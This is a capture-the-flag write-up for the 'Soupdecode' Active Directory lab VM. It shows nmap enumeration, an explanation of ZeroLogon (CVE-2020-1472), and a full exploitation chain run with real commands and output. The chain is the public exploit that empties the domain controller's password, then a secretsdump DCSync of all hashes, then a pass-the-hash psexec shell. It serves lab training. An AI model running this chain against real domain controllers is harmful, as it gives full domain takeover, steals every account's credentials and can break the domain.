---
layout: writeup
category: HMV
chall_description: https://drive.google.com/file/d/13kHXXZy3Ar5KVgPbhMgy8Z-SgVeXiO3p/view?usp=drivesdk
points: 0
solves: 0
tags: Active-Directory
date: 2024-06-15
comments: true
---
## Introduction

**Soupdecode** is an Active Directory CTF laboratory which involves the explotation of multiple services. There are several ways to attack it, and I'll show some of them in this writeup. Let's just jump in.

## Enumeration

As always we start with the `nmap`:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.0.118
```

Here we get some ports that are default on Active Directory:

```bash
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.0.118
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-15 13:40 CEST
Initiating ARP Ping Scan at 13:40
Scanning 192.168.0.118 [1 port]
Completed ARP Ping Scan at 13:40, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:40
Scanning 192.168.0.118 [65535 ports]
Discovered open port 135/tcp on 192.168.0.118
Discovered open port 445/tcp on 192.168.0.118
Discovered open port 139/tcp on 192.168.0.118
Discovered open port 49154/tcp on 192.168.0.118
Discovered open port 3268/tcp on 192.168.0.118
Discovered open port 49157/tcp on 192.168.0.118
Discovered open port 593/tcp on 192.168.0.118
Discovered open port 49161/tcp on 192.168.0.118
Discovered open port 88/tcp on 192.168.0.118
Discovered open port 49155/tcp on 192.168.0.118
Discovered open port 464/tcp on 192.168.0.118
Discovered open port 636/tcp on 192.168.0.118
Discovered open port 49158/tcp on 192.168.0.118
Discovered open port 3269/tcp on 192.168.0.118
Discovered open port 389/tcp on 192.168.0.118
Discovered open port 9389/tcp on 192.168.0.118
Completed SYN Stealth Scan at 13:41, 26.39s elapsed (65535 total ports)
Nmap scan report for 192.168.0.118
Host is up, received arp-response (0.00016s latency).
Scanned at 2024-06-15 13:40:47 CEST for 26s
Not shown: 65519 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
49154/tcp open  unknown          syn-ack ttl 128
49155/tcp open  unknown          syn-ack ttl 128
49157/tcp open  unknown          syn-ack ttl 128
49158/tcp open  unknown          syn-ack ttl 128
49161/tcp open  unknown          syn-ack ttl 128
MAC Address: 08:00:27:5F:F1:84 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
           Raw packets sent: 131071 (5.767MB) | Rcvd: 33 (1.436KB)
```

If we take a look at SMB, we can notice it's Windows Server 2008:

```bash
❯ cme smb 192.168.0.118
SMB         192.168.0.118   445    DC01             [*] Windows 6.1 Build 7600 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:False)
```

## Foothold
### ZeroLogon

From the first moment that *ZeroLogon* was made public in August 2020, it quickly became one of those vulnerabilities that shake the cybersecurity world for several reasons: simplicity of exploitation and anyone can obtain the public exploits that would give the attacker full control of the domain. In other words, *ZeroLogon* allows any user, without even needing to have a domain account, to escalate privileges to the maximum in the domain.

This vulnerability was discovered by Tom Tervoot of Secura and is mainly found in the Netlogon service. Netlogon Remote Protocol is an RPC interface for domain controllers, which is used for different tasks such as user and machine authentication.

The purpose of this protocol is to make it easier for users to log on to servers using NTLM, but also to authenticate NTP responses or to allow a computer to update the password in the domain.

Netlogon does not use an authentication scheme similar to other RPC services. It uses a cryptographic protocol based on AES-CFB8. The idea is that client and server prove to each other that they know the shared secret. The shared secret is a hash of the client's computer account password. This is because Windows NT could not make use of standard schemes such as NTLM or Kerberos.

The implementation based on AES-CFB8 was not properly done. The client and server use a function called ComputeNetlogonCredential, which does not define random IVs and makes them fixed with zeros (up to 16 bytes). The probability of "predicting" and getting a block with all zeros is low for a given random key.

Following this principle, a call may be authenticated by providing an authenticator and a timestamp with all zeros and then using the NEtrServerPasswordSet2 call to set a new team account password with zero length, i.e. empty. If this is done against a domain controller's computer account, its password can be changed to null and it can now authenticate as a domain controller without a password.

Because this situation is not common, updating the password of a domain controller account to a null password can cause the domain to stop functioning properly. This is why it is not recommended to use this exploit in production environments and, in either case, as will be explained later, the pre-exploit password should be reset immediately after the exploit to avoid domain failures.

Full technical details of the vulnerability can be found in the blog posted by Secura at https://www.secura.com/blog/zero-logon.

For the proof of concept, we will use this machine called `Soupdecode 01`, which has hostname DC01 and IP 192.168.0.118. We will use [dirkjanm](https://github.com/dirkjanm/CVE-2020-1472)'s exploit.

```bash
git clone https://github.com/dirkjanm/CVE-2020-1472.git
cd CVE-2020-1472
python3 cve-2020-1472-exploit.py DC01 192.168.0.118
```

> Note: We'll need to add `DC01` and `soupedecode.local` to our `/etc/hosts` to point to the IP

```bash
❯ python3 cve-2020-1472-exploit.py DC01 192.168.0.118
Performing authentication attempts...
========================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

As of this time, the account `DC01$`, which is the computer domain account of the domain controller DC01, has a hash of a null password. This account ends with a `$` symbol since it is a computer account.

As now the credentials of the account of a domain controller are known, and these have privileges to do `DCSync` and thus obtain all the credentials of all the accounts, thus escalating privileges to the full domain.

To do so, we proceed to run `secretsdump.py` from Impacket in order to do `DCSync` using the `DC01$` account which is password-less. In this case, the command is the following:

```bash
secretsdump.py -no-pass -just-dc soupedecode.local/DC01\$@192.168.0.118
```

I'll save the output into a file to get all the hashes; I can retrieve Administrator's hash and check out if it works with `crackmapexec`:

```bash
❯ cme smb 192.168.0.118 -u administrator -H ace06395a1fd5d9f36bd9ae3ebf55fd8
SMB         192.168.0.118   445    DC01             [*] Windows 6.1 Build 7600 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:False)
SMB         192.168.0.118   445    DC01             [+] soupedecode.local\administrator:ace06395a1fd5d9f36bd9ae3ebf55fd8 (Pwn3d!)
```

Now I simply use `psexec` to connect and read the flags:

```bash
❯ impacket-psexec -hashes :ace06395a1fd5d9f36bd9ae3ebf55fd8 soupedecode.local/Administrator@192.168.0.118
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

[*] Requesting shares on 192.168.0.118.....
[*] Found writable share ADMIN$
[*] Uploading file CDPvGdUy.exe
[*] Opening SVCManager on 192.168.0.118.....
[*] Creating service SXLi on 192.168.0.118.....
[*] Starting service SXLi.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
a******************************a
C:\Windows\system32> dir C:\Users\
 Volume in drive C has no label.
 Volume Serial Number is BCB3-AE45

 Directory of C:\Users

06/10/2024  12:06 PM    <DIR>          .
06/10/2024  12:06 PM    <DIR>          ..
06/10/2024  03:28 PM    <DIR>          Administrator
07/13/2009  09:52 PM    <DIR>          Public
06/10/2024  12:06 PM    <DIR>          ybob317
               0 File(s)              0 bytes
               5 Dir(s)  27,351,764,992 bytes free

C:\Windows\system32> type C:\Users\ybob317\Desktop\user.txt
6******************************b
C:\Windows\system32> 
```

